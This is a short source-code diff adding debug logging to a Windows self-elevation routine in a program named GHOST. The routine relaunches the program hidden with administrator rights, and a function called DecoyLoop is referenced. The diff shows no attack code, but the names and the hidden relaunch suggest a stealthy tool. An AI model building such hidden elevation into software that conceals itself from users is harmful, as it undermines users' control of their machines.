@@ -31,9 +31,12 @@ static void DecoyLoop() {
 
 // ─── Admin elevation ──────────────────────────────────────────────────────────
 static BOOL EnsureElevated() {
-    if (IsElevated()) return TRUE;
+    printf("[DEBUG] EnsureElevated: checking IsElevated\n"); fflush(stdout);
+    if (IsElevated()) { printf("[DEBUG] EnsureElevated: already elevated\n"); fflush(stdout); return TRUE; }
+    printf("[DEBUG] EnsureElevated: not elevated, getting exe path\n"); fflush(stdout);
     wchar_t exePath[MAX_PATH] = {};
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
+    printf("[DEBUG] EnsureElevated: calling ShellExecuteExW runas\n"); fflush(stdout);
     SHELLEXECUTEINFOW sei = {};
     sei.cbSize = sizeof(sei);
     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -41,7 +44,9 @@ static BOOL EnsureElevated() {
     sei.lpFile = exePath;
     sei.lpParameters = L"--elevated";
     sei.nShow = SW_HIDE;
-    if (ShellExecuteExW(&sei)) { Sleep(1000); return FALSE; }
+    BOOL ok = ShellExecuteExW(&sei);
+    printf("[DEBUG] EnsureElevated: ShellExecuteExW returned %d, err=%lu\n", ok, GetLastError()); fflush(stdout);
+    if (ok) { Sleep(1000); return FALSE; }
     MessageBoxW(NULL, L"GHOST requires administrator privileges.", L"Elevation Required", MB_ICONERROR | MB_OK);
     return FALSE;
 }
